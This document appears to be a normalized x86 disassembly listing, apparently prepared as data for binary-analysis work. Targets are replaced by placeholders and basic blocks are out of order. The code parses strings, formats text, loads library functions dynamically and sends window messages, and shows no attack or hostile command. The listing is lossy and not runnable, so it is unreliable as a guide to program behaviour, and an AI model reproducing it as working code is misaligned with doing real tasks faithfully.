call sub_401e80
cmp [ esp + 0x28 ] ebp
mov eax [ esp + 0x14 ]
mov [ esp + 0x29c ] 0x1
jae r-xdata
push eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
lea eax [ esp + 0x14 ]
lea eax [ esp + 0x7c ]
lea edx [ eax + 0x1 ]
jmp r-xdata
push 0x5c
push 0x1
lea ecx [ esp + 0x18 ]
call sub_4017f0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x80 ]
push ecx
lea ecx [ esp + 0x18 ]
call sub_401cc0
test [ esp + 0x50 ] 0x10
je r-xdata
push r--data
lea edx [ esp + 0x80 ]
push edx
call [ lstrlenA@IAT ]
lea eax [ esp + eax + 0x7c ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
mov eax [ esp + 0x28 ]
jne r-xdata
cmp [ esp + 0x28 ] ebp
mov eax [ esp + 0x14 ]
jae r-xdata
cmp eax ebp
mov [ esp + 0x29c ] 0x0
jb r-xdata
cmp eax ebp
mov eax [ esp + 0x14 ]
jae r-xdata
push eax
call sub_40e060
add esp 0x4
jmp r-xdata
lea eax [ esp + 0x14 ]
mov [ esp + 0x28 ] esi
mov [ esp + 0x24 ] edi
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
push eax
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
mov [ esp + 0x4c ] edi
jne r-xdata
lea eax [ esp + 0x14 ]
mov eax [ esp + 0x28 ]
mov ebp [ GetProcAddress@IAT ]
push r--data
push edi
mov ebx 0x2
call ebp
mov esi eax
test esi esi
jne r-xdata
mov [ esp + 0x29c ] al
cmp [ esp + 0x28 ] ebp
jb r-xdata
lea eax [ esp + 0x4c ]
push eax
mov ecx rw-data
call sub_40df20
mov eax [ rw-data ]
test eax eax
jne r-xdata
push r--data
push edi
mov ebx 0x1
call ebp
mov esi eax
test esi esi
jne r-xdata
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
xor edi edi
jmp r-xdata
mov edx [ esp + 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov edi edx
xor edi edi
jmp r-xdata
push edi
call [ FreeLibrary@IAT ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x29c ] 0x0
call sub_4480e0
mov ebx [ esp + 0x2a4 ]
mov ebp 0x10
xor edi edi
jmp r-xdata
mov [ esp + 0x14 ] 0x0
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
push rw-data
call esi
lea esi [ edi + edi * 4 ]
mov ebp edi
shl esi 0x5
mov ebx [ esp + 0x2a4 ]
mov ebp 0x10
xor edi edi
mov esi 0xf
mov [ esi + edi ] ebx
inc ebp
add esi 0xa0
jmp r-xdata
cmp ebp edx
jge r-xdata
mov edi [ rw-data ]
test edi edi
jne r-xdata
sub_40e430
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_40d9d0
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_40e460
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_4bf085
push eax
mov eax 0x10200
mov [ fs : 0x0 ] esp
call sub_4b6180
mov eax [ rw-data ]
push ebx
push ebp
mov [ esp + 0x8c ] eax
mov eax [ esp + 0x1021c ]
xor ebx ebx
cmp eax ebx
push esi
push edi
jl r-xdata
mov ecx [ esp + 0x10228 ]
mov [ rw-data ] ecx
mov [ rw-data ] eax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push esi
lea ecx [ esp + 0x78 ]
call sub_401e80
push 0xffffffff
push ebx
lea ecx [ esp + 0x78 ]
push ecx
mov esi 0xf
lea ecx [ esp + 0x38 ]
mov [ esp + 0x10224 ] 0x1
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] ebx
mov [ esp + 0x3c ] bl
call sub_401dd0
mov [ esp + 0x48 ] ebp
push 0xffffffff
push ebx
lea edx [ esp + 0x34 ]
push edx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x10224 ] 0x2
mov [ esp + 0x70 ] esi
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
call sub_401dd0
mov eax [ esp + 0x48 ]
mov [ esp + 0x68 ] eax
lea ecx [ esp + 0x4c ]
push ecx
lea edx [ esp + 0x90 ]
push edx
lea ecx [ esp + 0x28 ]
mov [ esp + 0x10220 ] 0x3
call sub_40df90
cmp [ esp + 0x64 ] 0x10
jb r-xdata
mov dl [ esp + 0x1b ]
lea ecx [ esp + 0x20 ]
mov [ esp + 0x20 ] dl
call sub_432c20
mov [ esp + 0x24 ] eax
mov [ eax + 0x2d ] 0x1
mov eax [ esp + 0x24 ]
mov [ eax + 0x4 ] eax
mov eax [ esp + 0x24 ]
mov [ eax ] eax
mov eax [ esp + 0x24 ]
mov [ eax + 0x8 ] eax
mov [ esp + 0x28 ] ebx
mov [ esp + 0x10218 ] ebx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
mov eax [ esp + 0x44 ]
mov edi 0x10
cmp eax edi
mov esi 0xf
mov [ esp + 0x64 ] esi
mov [ esp + 0x60 ] ebx
mov [ esp + 0x50 ] bl
jb r-xdata
mov eax [ esp + 0x50 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x88 ] edi
mov [ esp + 0x44 ] esi
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
mov [ esp + 0x10218 ] bl
jb r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x14 ]
add eax 0x4
cmp eax 0x34
mov [ esp + 0x88 ] esi
mov [ esp + 0x84 ] ebx
mov [ esp + 0x74 ] bl
mov [ esp + 0x14 ] eax
jb r-xdata
mov edx [ esp + 0x74 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x10 ]
mov ebp eax
inc eax
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x14 ]
mov esi [ eax + rw-data ]
mov eax esi
mov [ esp + 0x88 ] 0xf
mov [ esp + 0x84 ] ebx
mov [ esp + 0x74 ] bl
lea edi [ eax + 0x1 ]
mov ebp [ esp + 0x10224 ]
cmp ebp ebx
jl r-xdata
mov ecx [ esp + 0x28 ]
mov [ esp + 0x1c ] ecx
lea ebp [ ebp + ebp * 4 ]
mov [ esp + 0x14 ] 0x1
shl ebp 0x5
mov [ esp + 0x1c ] 0x1c
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
mov ecx [ esi + ebp + 0x34 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
push 0xffffffff
push ebx
lea eax [ esp + 0xa0 ]
push eax
call sub_401dd0
cmp [ esp + 0xb0 ] 0x10
mov ecx [ esp + 0x94 ]
mov [ rw-data ] ecx
jb r-xdata
mov edi edi
mov [ esp + 0x10 ] eax
mov [ esp + 0xb0 ] 0xf
mov [ esp + 0xac ] ebx
mov [ esp + 0x9c ] bl
mov al [ eax ]
cmp al bl
mov [ esp + 0x10218 ] 0x9
je r-xdata
mov eax [ esp + 0x28 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x14 ] 0x1
lea esp [ esp ]
mov eax [ esp + 0x10 ]
mov esi [ esi + ebp + 0x30 ]
mov edx [ esp + 0x1c ]
mov edi eax
inc eax
push 0xffffffff
mov [ esp + 0x14 ] eax
lea eax [ edx + esi ]
push ebx
push eax
lea ecx [ esp + 0x38 ]
mov [ esp + 0x50 ] 0xf
mov [ esp + 0x4c ] ebx
mov [ esp + 0x3c ] bl
call sub_401dd0
mov [ esp + 0x48 ] edi
push 0xffffffff
push ebx
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x58 ]
mov [ esp + 0x10224 ] 0x4
mov [ esp + 0x70 ] 0xf
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
call sub_401dd0
mov ecx [ esp + 0x48 ]
mov [ esp + 0x68 ] ecx
lea edx [ esp + 0x4c ]
push edx
lea eax [ esp + 0x90 ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x10220 ] 0x5
call sub_40df90
cmp [ esp + 0x64 ] 0x10
jb r-xdata
cmp [ esp + 0x14 ] edx
jge r-xdata
mov eax [ esp + 0x24 ]
push eax
mov [ esp + 0xb4 ] 0xf
mov [ esp + 0xb0 ] ebx
mov [ esp + 0xa0 ] bl
mov ecx [ eax ]
push ecx
lea eax [ esp + 0x94 ]
push eax
lea ecx [ esp + 0x2c ]
mov [ esp + 0x10224 ] 0xffffffff
call sub_40d9d0
mov ecx [ esp + 0x24 ]
push ecx
mov edx [ esp + 0x9c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp al 0xe0
jb r-xdata
cmp al 0x9f
jbe r-xdata
mov ecx [ eax + ebp + 0x34 ]
sub ecx edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
cmp [ esp + 0x44 ] 0x10
mov esi 0xf
mov [ esp + 0x64 ] esi
mov [ esp + 0x60 ] ebx
mov [ esp + 0x50 ] bl
mov [ esp + 0x10218 ] bl
jb r-xdata
mov ecx [ esp + 0x50 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp al 0x40
jne r-xdata
cmp al 0xff
ja r-xdata
mov [ esp + 0xb8 ] al
mov edx [ esp + 0xb8 ]
push edx
push 0x1
lea ecx [ esp + 0xa0 ]
call sub_4017f0
mov esi [ esp + 0x10 ]
mov al [ esi + 0x1 ]
inc esi
mov [ esp + 0xbc ] al
mov ecx [ esp + 0xbc ]
push ecx
mov ecx [ esp + 0x10220 ]
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
mov edx eax
push edx
lea eax [ esp + 0xe8 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov eax [ esp + 0x1c ]
mov esi eax
add esp 0xc
inc eax
mov [ esp + 0x10 ] eax
lea eax [ esp + 0xe4 ]
mov [ esp + 0x88 ] 0xf
mov [ esp + 0x84 ] ebx
mov [ esp + 0x74 ] bl
lea edi [ eax + 0x1 ]
mov edi edi
mov eax [ esp + 0x14 ]
cmp eax edx
jge r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x1c ]
inc ecx
add eax 0x1c
mov [ esp + 0x44 ] esi
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
mov [ esp + 0x14 ] ecx
mov [ esp + 0x1c ] eax
jmp r-xdata
mov edx [ esp + 0x30 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0x8c ] al
mov eax [ esp + 0x8c ]
push eax
push 0x1
lea ecx [ esp + 0xa0 ]
call sub_4017f0
inc [ esp + 0x10 ]
mov esi [ esp + 0x10 ]
cmp [ esi + 0x1 ] 0x40
jne r-xdata
mov ecx [ esp + 0x10 ]
mov al [ ecx ]
cmp al bl
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
lea ecx [ esp + 0xe8 ]
push ecx
lea ecx [ esp + 0x78 ]
call sub_401e80
push 0xffffffff
push ebx
lea edx [ esp + 0x78 ]
mov edi 0xf
push edx
lea ecx [ esp + 0x38 ]
mov [ esp + 0x10224 ] 0x6
mov [ esp + 0x50 ] edi
mov [ esp + 0x4c ] ebx
mov [ esp + 0x3c ] bl
call sub_401dd0
mov [ esp + 0x48 ] esi
push 0xffffffff
push ebx
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x58 ]
mov [ esp + 0x10224 ] 0x7
mov [ esp + 0x70 ] edi
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
call sub_401dd0
mov ecx [ esp + 0x48 ]
mov [ esp + 0x68 ] ecx
lea edx [ esp + 0x4c ]
push edx
lea eax [ esp + 0x90 ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x10220 ] 0x8
call sub_40df90
cmp [ esp + 0x64 ] 0x10
jb r-xdata
mov edi [ rw-data ]
mov eax edi
shl eax 0x4
mov esi [ eax + rw-data ]
mov eax [ esi + ebp + 0x30 ]
cmp eax ebx
jne r-xdata
cmp al 0x80
jb r-xdata
mov ecx [ esp + 0x10220 ]
inc esi
mov [ esp + 0x10 ] esi
mov esi [ esp + 0x24 ]
mov ebp [ esi ]
cmp ebp esi
mov [ esp + 0x14 ] ebp
je r-xdata
push 0x40
push 0x1
lea ecx [ esp + 0xa0 ]
call sub_4017f0
add esi 0x2
mov [ esp + 0x10 ] esi
jmp r-xdata
mov eax [ esp + 0x44 ]
mov edi 0x10
cmp eax edi
mov esi 0xf
mov [ esp + 0x64 ] esi
mov [ esp + 0x60 ] ebx
mov [ esp + 0x50 ] bl
jb r-xdata
mov ecx [ esp + 0x50 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov esi [ esp + 0x10 ]
mov cl [ esi ]
mov [ esp + 0xb4 ] cl
mov edx [ esp + 0xb4 ]
push edx
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
je r-xdata
cmp [ esp + 0x88 ] edi
mov [ esp + 0x44 ] esi
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
mov [ esp + 0x10218 ] bl
jb r-xdata
mov edx [ esp + 0x30 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push 0x1
lea ecx [ esp + 0xa0 ]
call sub_4017f0
inc esi
mov [ esp + 0x10 ] esi
jmp r-xdata
cmp [ ebp + 0x2d ] bl
jne r-xdata
mov eax [ ebp + 0x24 ]
xor edi edi
cmp eax 0x10
jb r-xdata
mov eax [ esp + 0x14 ]
mov edi [ rw-data ]
inc eax
mov [ esp + 0x88 ] esi
mov [ esp + 0x84 ] ebx
mov [ esp + 0x74 ] bl
mov [ esp + 0x14 ] eax
jmp r-xdata
mov eax [ esp + 0x74 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp ebp esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x2d ] bl
jne r-xdata
lea edx [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
jmp r-xdata
shl edi 0x4
mov eax [ edi + rw-data ]
mov edx [ eax + ebp + 0x30 ]
cmp edx ebx
jne r-xdata
mov esi [ esp + 0x10 ]
mov cl [ esi ]
mov [ esp + 0xb4 ] cl
mov edx [ esp + 0xb4 ]
push edx
jmp r-xdata
mov eax [ ebp + 0x4 ]
cmp [ eax + 0x2d ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x2d ] bl
jne r-xdata
cmp [ edx + edi ] bl
je r-xdata
mov esi [ esp + 0x10 ]
mov eax edx
sub esi edx
mov cl [ edx ]
cmp cl bl
je r-xdata
mov ebp eax
cmp ebp [ eax + 0x8 ]
jne r-xdata
mov ebp ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x2d ] bl
je r-xdata
mov ecx [ esp + 0x10 ]
cmp [ edi + ecx ] 0x5b
mov esi [ esp + 0x10228 ]
jne r-xdata
mov esi [ esp + 0x24 ]
mov cl [ eax + 0x1 ]
inc edi
inc eax
cmp cl bl
jne r-xdata
mov ebp eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x2d ] bl
je r-xdata
mov [ esp + 0x14 ] ebp
mov ebp 0xf
inc edi
mov al [ edi + ecx ]
cmp al bl
lea edx [ edi + ecx ]
mov ebp 0x1
mov esi edi
je r-xdata
cmp cl [ esi + eax ]
jne r-xdata
mov ecx [ esp + 0x10224 ]
cmp ecx 0xffffffff
jne r-xdata
sub eax ecx
add eax 0xd
cmp [ esp + 0xb0 ] 0x10
mov edx [ esp + 0x94 ]
mov [ rw-data ] edx
jb r-xdata
cmp al 0x80
jb r-xdata
mov [ esp + 0xe0 ] ebp
mov [ esp + 0xdc ] ebx
mov [ esp + 0xcc ] bl
mov [ esp + 0xc0 ] eax
mov [ esp + 0xc4 ] esi
cmp ecx ebx
mov al [ rw-data ]
mov [ esp + 0x1b ] al
jl r-xdata
cmp eax 0x9
je r-xdata
mov ecx [ esp + 0x24 ]
push ecx
mov [ esp + 0xb4 ] 0xf
mov [ esp + 0xb0 ] ebx
mov [ esp + 0xa0 ] bl
mov eax [ ecx ]
push eax
lea ecx [ esp + 0x94 ]
push ecx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x10224 ] 0xffffffff
call sub_40d9d0
mov edx [ esp + 0x24 ]
push edx
jmp r-xdata
mov eax [ esp + 0x9c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp al 0xe0
jb r-xdata
cmp al 0x9f
jbe r-xdata
mov [ esp + 0x44 ] ebp
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
push 0x1
lea ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0xc8 ]
mov [ esp + 0x10220 ] 0xe
call sub_40c510
push 0xffffffff
push ebx
lea edx [ esp + 0x34 ]
push edx
lea ecx [ esp + 0xa4 ]
call sub_4018c0
cmp [ esp + 0x10224 ] ebx
jl r-xdata
mov [ rw-data ] bl
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x24 ]
add edx edi
cmp eax ecx
mov [ esp + 0x10 ] edx
jne r-xdata
cmp eax 0xa
je r-xdata
call j_sub_4b66ed#2
mov ecx [ esp + 0x10214 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1020c
retn
cmp al 0x5b
jne r-xdata
cmp al 0xff
ja r-xdata
add edi 0x2
jmp r-xdata
mov eax [ esp + 0x44 ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov al [ esp + 0x1b ]
mov [ rw-data ] al
cmp al 0x5d
jne r-xdata
inc ebp
mov al [ edi + ecx ]
cmp al bl
jne r-xdata
cmp [ esp + 0xe0 ] esi
mov [ esp + 0x44 ] ebp
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
mov [ esp + 0x10218 ] 0x9
jb r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
inc edi
dec ebp
je r-xdata
cmp ebp ebx
jg r-xdata
mov [ esp + 0xe0 ] ebp
mov [ esp + 0xdc ] ebx
mov [ esp + 0xcc ] bl
mov edx [ esp + 0xcc ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ebp 0xf
inc edi
mov [ esp + 0x88 ] ebp
mov [ esp + 0x84 ] ebx
mov [ esp + 0x74 ] bl
mov eax edi
sub eax esi
push eax
push edx
lea ecx [ esp + 0x78 ]
mov [ esp + 0x10220 ] 0xa
call sub_401e80
mov ecx [ rw-data ]
mov edx [ esp + 0x10224 ]
push ecx
push edx
lea eax [ esp + 0x78 ]
push eax
call sub_40e460
add esp 0xc
lea ecx [ esp + 0x1e4 ]
call sub_438500
cmp [ esp + 0x88 ] 0x10
mov eax [ esp + 0x74 ]
mov [ esp + 0x10218 ] 0xb
jae r-xdata
push eax
lea ecx [ esp + 0x1e8 ]
call j_sub_44f660
mov [ esp + 0x6c ] ebp
mov [ esp + 0x68 ] ebx
mov [ esp + 0x58 ] bl
mov [ esp + 0x4c ] 0x76
lea ecx [ esp + 0x4c ]
push ecx
lea ecx [ esp + 0x1e8 ]
mov [ esp + 0x1021c ] 0xc
call sub_439260
movsx eax [ esp + 0x4c ]
add eax 0xffffff9e
cmp eax 0x11
ja r-xdata
lea eax [ esp + 0x74 ]
xor esi esi
movzx edx [ eax + lookup_table_40ef10 ]
jmp [ edx * 4 + jump_table_40eefc ]
lea ecx [ esp + 0x1e4 ]
mov [ esp + 0x6c ] ebp
mov [ esp + 0x68 ] ebx
mov [ esp + 0x58 ] bl
mov [ esp + 0x10218 ] 0xa
call sub_44f5f0
cmp [ esp + 0x88 ] 0x10
mov [ esp + 0x10218 ] 0x9
jb r-xdata
mov eax [ esp + 0x58 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
movzx esi [ esp + 0x50 ]
jmp r-xdata
mov esi [ esp + 0x50 ]
jmp r-xdata
fld [ esp + 0x50 ]
call sub_4b64c4
mov esi eax
jmp r-xdata
mov esi [ esp + 0x68 ]
jmp r-xdata
mov [ esp + 0x88 ] ebp
mov [ esp + 0x84 ] ebx
mov [ esp + 0x74 ] bl
jmp r-xdata
mov ecx [ esp + 0x74 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x6c ]
dec esi
cmp eax 0x10
jb r-xdata
mov edx [ esp + 0x14 ]
mov eax [ edx + 0x28 ]
mov ecx [ esp + 0x1c ]
cmp eax ecx
jl r-xdata
sub_40ef30
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bf109
push eax
mov eax 0x10108
mov [ fs : 0x0 ] esp
call sub_4b6180
push esi
push edi
lea ecx [ esp + 0xe4 ]
call sub_438500
mov eax [ rw-data ]
shl eax 0x4
add eax rw-data
mov edx [ eax + 0x4 ]
xor edi edi
xor esi esi
cmp edx edi
mov [ esp + 0x10118 ] edi
jne r-xdata
mov ecx [ eax + 0x8 ]
sub ecx edx
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
cmp esi edx
mov [ esp + 0xc ] esi
jge r-xdata
lea edx [ eax + 0x1 ]
mov esi eax
mov [ esp + 0x18 ] edx
mov eax [ esp + 0x10120 ]
cmp eax 0xffffffff
mov [ esp + 0x18 ] edx
je r-xdata
lea ecx [ esp + 0xe4 ]
mov [ esp + 0x10118 ] 0xffffffff
call sub_44f5f0
mov ecx [ esp + 0x10110 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10114
retn
push ebx
push ebp
lea ebp [ esi + esi * 4 ]
shl ebp 0x5
jmp r-xdata
mov ecx [ rw-data ]
shl ecx 0x4
mov eax [ ecx + rw-data ]
mov edx [ eax + ebp + 0x70 ]
xor esi esi
cmp edx edi
jne r-xdata
mov ecx [ eax + ebp + 0x74 ]
sub ecx edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x18 ] edx
mov [ esp + 0x18 ] edi
jmp r-xdata
cmp esi [ esp + 0x18 ]
mov ebx esi
jge r-xdata
mov esi eax
inc eax
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x1012c ]
cmp eax 0xffffffff
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov eax esi
imul eax eax 0x1c
lea esi [ esi + esi * 4 ]
shl esi 0x2
mov [ esp + 0x10 ] eax
mov [ esp + 0x1c ] esi
mov edi edi
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x20 ]
inc eax
add ebp 0xa0
cmp eax ecx
mov [ esp + 0x14 ] eax
jl r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
jbe r-xdata
mov eax [ rw-data ]
mov esi [ esp + 0x1c ]
mov edx eax
shl edx 0x4
mov ecx [ edx + rw-data ]
mov edx [ ecx + ebp + 0x90 ]
cmp [ esi + edx ] 0x5
je r-xdata
pop ebp
pop ebx
cmp [ rw-data ] edi
je r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
lea edx [ esp + 0x2c ]
push edx
call sub_40e460
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov ecx [ eax + ebp + 0x40 ]
add esp 0xc
cmp [ ecx + ebx * 2 ] 0x73
jne r-xdata
mov [ esp + 0xa4 ] 0x76
shl eax 0x4
mov eax [ eax + rw-data ]
mov esi [ eax + ebp + 0x50 ]
cmp [ esi + ebx * 8 ] 0x63
mov [ esp + 0x10120 ] 0xa
jne r-xdata
push 0xffffffff
mov ecx edx
mov ecx [ esi + ecx + 0x8 ]
push edi
push ecx
lea ecx [ esp + 0x30 ]
call sub_401dd0
cmp [ esp + 0x38 ] edi
mov al [ esp + 0x10130 ]
test al al
je r-xdata
mov eax [ esp + 0xa4 ]
mov ecx [ esp + 0xa8 ]
mov [ esi + ebx * 8 ] eax
mov [ esi + ebx * 8 + 0x4 ] ecx
mov ecx [ esi + ebx * 8 + 0x4 ]
cmp ecx edi
je r-xdata
cmp [ esp + 0x3c ] 0x10
mov eax [ esp + 0x28 ]
jae r-xdata
mov eax [ eax + ebp + 0x80 ]
cmp [ eax + ebx ] 0x0
jne r-xdata
mov ecx [ rw-data ]
shl ecx 0x4
mov eax [ ecx + rw-data ]
mov bl [ eax + ebp + 0x4 ]
mov eax [ esp + 0x14 ]
mov ecx [ rw-data ]
xor edx edx
test bl bl
sete dl
push edx
push eax
push 0x4ce
push ecx
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov dl [ eax + ebp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
test dl dl
mov edx [ esp + 0x14 ]
sete cl
push ecx
push edx
push 0x4cd
push eax
jmp r-xdata
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
inc ebx
add edx 0x14
add ecx 0x1c
cmp ebx eax
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] edi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x1c ] edx
mov [ esp + 0x10 ] ecx
jl r-xdata
mov edx [ esp + 0x28 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
dec [ ecx + 0x4 ]
jne r-xdata
push eax
lea ecx [ esp + 0xf0 ]
call j_sub_44f660
mov [ esp + 0x7c ] 0xf
mov [ esp + 0x78 ] edi
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x5c ] 0x76
lea eax [ esp + 0x5c ]
push eax
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x10124 ] 0x5
call sub_439260
mov ecx [ rw-data ]
shl ecx 0x4
mov esi [ ecx + rw-data ]
mov eax [ esi + ebp + 0x40 ]
cmp [ eax + ebx * 2 ] 0x62
jne r-xdata
lea eax [ esp + 0x28 ]
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] edi
mov [ esp + 0x44 ] 0x0
cmp [ esp + 0x3c ] 0x10
mov edi [ esp + 0x28 ]
mov [ esp + 0x10120 ] 0x2
jae r-xdata
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
mov ecx [ esp + 0x10 ]
shl eax 0x4
mov eax [ eax + rw-data ]
mov eax [ eax + ebp + 0x70 ]
push 0xffffffff
add eax ecx
push edi
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] edi
mov [ esp + 0x34 ] 0x0
call sub_401dd0
cmp [ esp + 0x38 ] edi
mov [ esp + 0x10120 ] 0x1
jne r-xdata
mov edx [ ecx ]
push 0x1
call [ edx + 0x18 ]
mov eax [ esi + ebp + 0x40 ]
cmp [ eax + ebx * 2 ] 0x69
jne r-xdata
lea ecx [ esp + 0x5c ]
call sub_40b120
mov [ esp + 0x90 ] 0x62
mov [ esp + 0x94 ] al
mov esi [ esi + ebp + 0x50 ]
cmp [ esi + ebx * 8 ] 0x63
mov [ esp + 0x10120 ] 0x6
jne r-xdata
mov eax [ esp + 0x38 ]
xor esi esi
test eax eax
jle r-xdata
lea edi [ esp + 0x28 ]
mov eax [ esi + ebp + 0x40 ]
cmp [ eax + ebx * 2 ] 0x66
jne r-xdata
movsx eax [ esp + 0x5c ]
add eax 0xffffff9e
cmp eax 0x11
ja r-xdata
mov eax [ esp + 0x90 ]
mov ecx [ esp + 0x94 ]
mov [ esi + ebx * 8 ] eax
mov [ esi + ebx * 8 + 0x4 ] ecx
jmp r-xdata
mov ecx [ esi + ebx * 8 + 0x4 ]
cmp ecx edi
je r-xdata
lea eax [ esp + 0x40 ]
push eax
lea ecx [ esp + 0xb8 ]
push r--data
push ecx
call sub_40c3c0
push r--data
push eax
lea edx [ esp + 0xe4 ]
push edx
mov [ esp + 0x10138 ] 0x3
call sub_402140
add esp 0x18
push 0xffffffff
xor edi edi
push edi
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x1012c ] 0x4
call sub_401dd0
cmp [ esp + 0xe8 ] 0x10
jb r-xdata
mov al [ esi + edi ]
mov cl al
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
ja r-xdata
mov esi [ esi + ebp + 0x40 ]
cmp [ esi + ebx * 2 ] 0x73
jne r-xdata
lea ecx [ esp + 0x5c ]
call sub_40b200
fstp [ esp + 0x84 ]
mov [ esp + 0x80 ] 0x66
mov esi [ esi + ebp + 0x50 ]
cmp [ esi + ebx * 8 ] 0x63
mov [ esp + 0x10120 ] 0x8
jne r-xdata
xor edi edi
movzx edx [ eax + lookup_table_40f778 ]
jmp [ edx * 4 + jump_table_40f764 ]
mov al [ esp + 0x10134 ]
test al al
je r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
cmp [ esp + 0xcc ] 0x10
mov esi 0xf
mov [ esp + 0xe8 ] esi
mov [ esp + 0xe4 ] edi
mov [ esp + 0xd4 ] 0x0
jb r-xdata
